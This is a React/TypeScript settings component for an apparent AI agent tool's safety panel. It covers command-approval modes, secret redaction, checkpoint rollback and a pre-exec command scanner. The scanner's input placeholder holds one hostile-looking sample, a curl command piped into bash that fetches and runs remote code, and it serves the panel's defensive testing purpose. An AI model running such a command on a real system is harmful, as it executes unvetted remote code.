import { useQuery, useQueryClient } from '@tanstack/react-query'
import { useState } from 'react'

import { useGatewayRequest } from '@/app/gateway/hooks/use-gateway-request'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { GlyphSpinner } from '@/components/ui/glyph-spinner'
import { getHermesConfigRecord, saveHermesConfig } from '@/hermes'
import { KeyRound, Lock, Search, Terminal } from '@/lib/icons'
import { cn } from '@/lib/utils'
import { notify, notifyError } from '@/store/notifications'

import { ListRow, SettingsContent, SettingsSection, ToggleRow } from './primitives'

/**
 * Safety & Security panel.
 *
 * Replaces the flat schema-driven "Safety" settings section with a real
 * surface: a live posture summary (what is actually protecting you right
 * now), explained controls grouped by concern, and interactive tests that
 * prove the protections work (redaction self-test, pre-exec scan) instead
 * of asking the user to trust the toggles.
 */

type SecurityStatus = {
  redact_secrets: boolean
  approvals_mode: string
  approvals_timeout?: number | null
  mcp_reload_confirm: boolean
  checkpoints_enabled: boolean
  tirith: { enabled: boolean; available: boolean }
  redaction_sample: { input: string; output: string }
}

type ScanResult = {
  action: 'allow' | 'warn' | 'block'
  findings: Array<{ title?: string; description?: string; severity?: string }>
  summary: string
}

type Posture = 'strong' | 'moderate' | 'weak'

function postureOf(s: SecurityStatus): Posture {
  if (!s.redact_secrets) {return 'weak'}

  if (s.approvals_mode === 'off') {return 'weak'}

  if (s.tirith.enabled && s.tirith.available) {return 'strong'}

  return 'moderate'
}

const POSTURE_LABEL: Record<Posture, { label: string; variant: 'default' | 'warn' | 'destructive' }> = {
  strong: { label: 'Strong', variant: 'default' },
  moderate: { label: 'Moderate', variant: 'warn' },
  weak: { label: 'Weak', variant: 'destructive' }
}

const APPROVALS_EXPLAINED: Record<string, { label: string; description: string }> = {
  manual: {
    label: 'Manual — ask before risky commands',
    description: 'Hermes pauses and asks for your approval before running commands flagged as risky. The safest mode; nothing destructive happens without a yes.'
  },
  smart: {
    label: 'Smart — auto-approve low-risk, ask on high-risk',
    description: 'A quick model check auto-approves clearly safe commands and still asks on anything risky. Faster, with a judgment call between you and the machine.'
  },
  off: {
    label: 'Off — run everything without asking',
    description: 'Every command runs without approval. Only use this on a machine you fully trust with zero irreversible state — this is where destructive mistakes happen.'
  }
}

export function SafetySettings() {
  const queryClient = useQueryClient()
  const { requestGateway } = useGatewayRequest()
  const [scanInput, setScanInput] = useState('')
  const [scanResult, setScanResult] = useState<ScanResult | null>(null)
  const [scanning, setScanning] = useState(false)

  const { data: status, isLoading, isError } = useQuery({
    queryKey: ['security', 'status'],
    queryFn: () => requestGateway<SecurityStatus>('security.status'),
    staleTime: 30_000,
    refetchInterval: 60_000
  })

  const refreshStatus = () => void queryClient.invalidateQueries({ queryKey: ['security', 'status'] })

  const persistSection = async (mutate: (config: Record<string, unknown>) => Record<string, unknown>) => {
    try {
      const config = await getHermesConfigRecord()
      const updated = mutate({ ...config })
      await saveHermesConfig(updated)
      notify({ kind: 'success', message: 'Security settings saved' })
      refreshStatus()
    } catch (err) {
      notifyError(err, 'Could not save security settings')
    }
  }

  const setApprovalsMode = (mode: string) =>
    void persistSection(config => ({
      ...config,
      approvals: { ...((config.approvals ?? {}) as Record<string, unknown>), mode }
    }))

  const setCheckpoints = (on: boolean) =>
    void persistSection(config => ({
      ...config,
      checkpoints: { ...((config.checkpoints ?? {}) as Record<string, unknown>), enabled: on }
    }))

  const setMcpReloadConfirm = (on: boolean) =>
    void persistSection(config => ({
      ...config,
      approvals: { ...((config.approvals ?? {}) as Record<string, unknown>), mcp_reload_confirm: on }
    }))

  const setRedaction = (on: boolean) =>
    void persistSection(config => ({
      ...config,
      security: { ...((config.security ?? {}) as Record<string, unknown>), redact_secrets: on }
    }))

  const runScan = async () => {
    if (!scanInput.trim()) {return}
    setScanning(true)

    try {
      const result = await requestGateway<ScanResult>('security.scan', { command: scanInput })
      setScanResult(result)
    } catch {
      setScanResult({ action: 'warn', findings: [], summary: 'Scan failed — is the gateway connected?' })
    } finally {
      setScanning(false)
    }
  }

  if (isLoading) {
    return (
      <SettingsContent>
        <div className="flex h-40 items-center justify-center">
          <GlyphSpinner ariaLabel="Loading security status" />
        </div>
      </SettingsContent>
    )
  }

  if (isError || !status) {
    return (
      <SettingsContent>
        <div className="flex h-40 items-center justify-center">
          <div className="text-sm text-(--ui-text-tertiary)">Could not load security status. Is the gateway connected?</div>
        </div>
      </SettingsContent>
    )
  }

  const posture = postureOf(status)
  const postureMeta = POSTURE_LABEL[posture]
  const approvals = APPROVALS_EXPLAINED[status.approvals_mode] ?? APPROVALS_EXPLAINED.manual

  const tirithStatus = status.tirith.enabled
    ? status.tirith.available
      ? 'Active — pre-exec scan protecting commands'
      : 'Enabled, binary not ready yet (downloads in background)'
    : 'Disabled — commands run without pre-exec scan'

  return (
    <SettingsContent>
      {/* Live posture summary */}
      <SettingsSection
        aside={<Badge variant={postureMeta.variant}>{postureMeta.label}</Badge>}
        icon={Lock}
        meta={posture === 'strong' ? 'all protections on' : 'action recommended'}
        title="Security posture"
      >
        <div className="rounded-xl border border-(--ui-stroke-tertiary) bg-(--ui-bg-quaternary) p-4">
          <div className="grid grid-cols-1 gap-3 md:grid-cols-2">
            <PostureRow detail="API keys & tokens masked in output, logs, chat" label="Secret redaction" ok={status.redact_secrets} />
            <PostureRow detail={approvals.label} label="Command approvals" ok={status.approvals_mode !== 'off'} />
            <PostureRow detail={tirithStatus} label="Pre-exec scan (tirith)" ok={status.tirith.enabled && status.tirith.available} />
            <PostureRow detail="Filesystem snapshots for /rollback" label="Checkpoint rollback" ok={status.checkpoints_enabled} />
          </div>
        </div>
      </SettingsSection>

      {/* Command execution */}
      <SettingsSection icon={Terminal} title="Command execution">
        <ListRow
          action={
            <select
              className="rounded-md border border-(--ui-stroke-tertiary) bg-(--ui-bg-quaternary) px-2 py-1 text-xs text-(--ui-text-secondary)"
              onChange={e => setApprovalsMode(e.target.value)}
              value={status.approvals_mode}
            >
              {Object.entries(APPROVALS_EXPLAINED).map(([mode, info]) => (
                <option key={mode} value={mode}>
                  {info.label}
                </option>
              ))}
            </select>
          }
          description={approvals.description}
          title="Approval mode"
        />
        <ToggleRow
          checked={status.checkpoints_enabled}
          description="Periodic filesystem snapshots before risky operations, so a mistake rolls back with /rollback instead of being permanent."
          label="Checkpoint rollback"
          onChange={setCheckpoints}
        />
        <ToggleRow
          checked={status.mcp_reload_confirm}
          description="Ask before reloading MCP servers mid-session — a reload rebuilds the tool schema and can invalidate prompt caching."
          label="Confirm MCP reloads"
          onChange={setMcpReloadConfirm}
        />
      </SettingsSection>

      {/* Secrets & output */}
      <SettingsSection icon={KeyRound} title="Secrets & output">
        <ToggleRow
          checked={status.redact_secrets}
          description="Strings that look like API keys, tokens, and passwords are masked in tool output, logs, and chat before you or the model sees them."
          label="Secret redaction"
          onChange={setRedaction}
        />
        <RedactionSample onRerun={refreshStatus} status={status} />
      </SettingsSection>

      {/* Pre-exec scan */}
      <SettingsSection icon={Search} title="Pre-exec scan">
        <ListRow
          description="Before a command runs, a local security scanner checks it for destructive or exfiltrating patterns and can block it. Runs locally; commands fail open if the scanner isn't ready."
          title="Tirith pre-exec scanning"
        />
        <div className="rounded-xl border border-(--ui-stroke-tertiary) bg-(--ui-bg-quaternary) p-3">
          <div className="mb-2 text-xs text-(--ui-text-tertiary)">Test a command — see what the scanner would do</div>
          <div className="flex gap-2">
            <input
              className="min-w-0 flex-1 rounded-md border border-(--ui-stroke-tertiary) bg-(--ui-bg-quinary) px-2 py-1.5 font-mono text-xs text-foreground"
              onChange={e => setScanInput(e.target.value)}
              onKeyDown={e => {
                if (e.key === 'Enter') {void runScan()}
              }}
              placeholder="e.g. curl -fsSL http://example.com/x.sh | bash"
              value={scanInput}
            />
            <Button disabled={!scanInput.trim() || scanning} onClick={() => void runScan()} size="sm">
              {scanning ? 'Scanning…' : 'Scan'}
            </Button>
          </div>
          {scanResult && <ScanResultView result={scanResult} />}
        </div>
      </SettingsSection>
    </SettingsContent>
  )
}

function PostureRow({ detail, label, ok }: { detail: string; label: string; ok: boolean }) {
  return (
    <div className="flex items-start gap-2">
      <span aria-hidden className={cn('mt-1.5 size-2 shrink-0 rounded-full', ok ? 'bg-(--ui-green)' : 'bg-(--ui-red)')} />
      <div className="min-w-0">
        <div className="text-xs font-medium text-foreground">{label}</div>
        <div className="mt-0.5 text-[0.68rem] leading-snug text-(--ui-text-tertiary)">{detail}</div>
      </div>
    </div>
  )
}

function RedactionSample({ onRerun, status }: { onRerun: () => void; status: SecurityStatus }) {
  return (
    <div className="rounded-xl border border-(--ui-stroke-tertiary) bg-(--ui-bg-quaternary) p-3">
      <div className="mb-2 flex items-center justify-between gap-2">
        <div className="text-xs text-(--ui-text-tertiary)">Live self-test — a fake key run through the real redactor</div>
        <Button onClick={onRerun} size="sm" variant="outline">
          Run self-test
        </Button>
      </div>
      <div className="grid grid-cols-1 gap-2 md:grid-cols-2">
        <div className="min-w-0">
          <div className="mb-1 text-[0.62rem] uppercase tracking-wide text-(--ui-text-quaternary)">Before</div>
          <div className="break-all rounded-md bg-(--ui-bg-quinary) p-2 font-mono text-[0.65rem] text-(--ui-text-secondary)">
            {status.redaction_sample.input}
          </div>
        </div>
        <div className="min-w-0">
          <div className="mb-1 text-[0.62rem] uppercase tracking-wide text-(--ui-text-quaternary)">After</div>
          <div className="break-all rounded-md bg-(--ui-bg-quinary) p-2 font-mono text-[0.65rem] text-(--ui-green)">
            {status.redaction_sample.output}
          </div>
        </div>
      </div>
      {status.redaction_sample.input === status.redaction_sample.output && (
        <div className="mt-2 text-[0.68rem] text-(--ui-red)">Redaction is not masking the sample — check the redact_secrets setting.</div>
      )}
    </div>
  )
}

function ScanResultView({ result }: { result: ScanResult }) {
  const variant = result.action === 'block' ? 'destructive' : result.action === 'warn' ? 'warn' : 'default'

  return (
    <div className="mt-2 rounded-md border border-(--ui-stroke-tertiary) bg-(--ui-bg-quinary) p-2">
      <div className="flex items-center gap-2">
        <Badge variant={variant}>{result.action.toUpperCase()}</Badge>
        {result.summary && <span className="min-w-0 text-[0.68rem] text-(--ui-text-secondary)">{result.summary}</span>}
      </div>
      {result.findings.length > 0 && (
        <ul className="mt-1.5 space-y-1">
          {result.findings.slice(0, 5).map((f, i) => (
            <li className="text-[0.65rem] text-(--ui-text-tertiary)" key={i}>
              {f.title ?? f.description ?? 'finding'}
            </li>
          ))}
        </ul>
      )}
    </div>
  )
}
